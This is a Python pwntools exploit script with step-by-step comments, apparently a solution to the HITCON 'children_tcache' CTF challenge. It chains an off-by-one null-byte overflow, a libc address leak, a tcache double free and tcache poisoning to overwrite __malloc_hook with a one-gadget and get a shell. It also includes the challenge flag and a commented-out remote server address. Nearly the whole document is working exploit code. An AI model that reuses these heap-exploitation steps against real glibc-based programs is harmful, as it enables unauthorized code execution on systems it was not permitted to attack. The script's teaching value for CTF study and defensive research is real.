#!/usr/bin/env python

from pwn import *

def new_heap(size, data, attack=False):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    if attack:
        return
    p.sendafter('Data:', data)
    if len(data) < size:
        p.sendline()

def show_heap(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def delete_heap(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))


# hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}
# p = remote('54.178.132.125', 8763)
p = process('./children_tcache')

# table[0] => chunk_0 (0x511)
new_heap(0x500, 'a' * 0x4ff)

# table[1] => chunk_1 (0x71)
new_heap(0x68, 'b' * 0x67)

# table[2] => chunk_2 (0x601)
new_heap(0x5f0, 'c' * 0x5ef)

# table[3] => chunk_3 (0x31)
# this chunk is for preventing consolidation of previous
# chunks with the top chunk
new_heap(0x20, 'd' * 0x20)

# we need to delete chunk_1, so we can re-allocate it again
# in order to launch off-by-one (poison-null-byte) attack
delete_heap(1)

# chunk_0 should we freed so it can be consolidated with chunk_2 later
delete_heap(0)


# when we free a chunk, programs writes 0xDA to the whole chunk
# so, we need to zero out some parts of the chunk_1. Therefore,
# we are allocating/freeing the chunk_1 multiple times with different sizes
# interestingly, it always have chunk size of 0x71, but the program only cares
# about the input size
for i in range(9):
    # table[0] => chunk_1 (0x71)
    # this causes strcpy writes null byte at the end of buffer.
    # when i == 0, off-by-one happens and turn size of chunk_2 from
    # 0x601 t0 0x600. Therefore, we clear PREV_IN_USE bit.
    new_heap(0x68 - i, 'b' * (0x68 - i))
    # we need to free the chunk, so malloc returns it on the next new_heap call
    delete_heap(0)
new_heap(0x68, b'b' * 0x60 + p64(0x580))

# when we free chunk_2, it consolidates with chunk_0
# therefore, we have a overlapping free chunk with chunk_1
# the resulting big chunk will be put in the unsorted bin
delete_heap(2)

# table[1] => chunk_4 (0x511)
# this will use the unsorted bin for allocation, and writes
# a libc address into chunk_1 fd/bk fields
new_heap(0x508, 'e' * 0x507)

# viwing chunk_1 will leak libc address
show_heap(0)

libc_addr = p.recvuntil('\n$$')[:-3]
libc_base = u64(libc_addr + b'\x00' * (8 - len(libc_addr))) - 0x3ebca0
log.info('LIBC Base: {}'.format(hex(libc_base)))


# table[2] => chunk_5 (0x71)
# this will allocate chunk_5 exactly in the same place as chunk_1
new_heap(0x68, 'f' * 0x67)

# we used tcache_dup attack here which is due to double free
# freeing chunk_1 and chunk_5 put them in the same bin in tcache
# even though they are pointing to the same address
delete_heap(0)
delete_heap(2)


# we can create a fake chunk before __malloc_hook with size of 0x7f
malloc_hook = libc_base + 0x3ebc30
fake_chunk = malloc_hook
log.info('fake chunk: {}'.format(hex(fake_chunk)))

# table[4] => chunk_5 (0x71)
# we used tcache_poisoning here
# chunk_5 will be served from tcache and we will put the address of
# our fake chunk in the chunk_1's fd.
new_heap(0x68, p64(fake_chunk))

# table[5] => chunk_1 (0x71)
# this allocation serves chunk_1 and put fake chunk address in the tcache
new_heap(0x68, 'h' * 0x67)

# table[6] => fake_chunk (0x7f)
# since fake_chunk is at the head of the list, this allocation returns it
# then, we overwrite __malloc_hook with one gadget
new_heap(0x68, p64(libc_base + 0x4f432))

# this allocation triggers __malloc_hook and we have shell
new_heap(1, '', True)

p.interactive()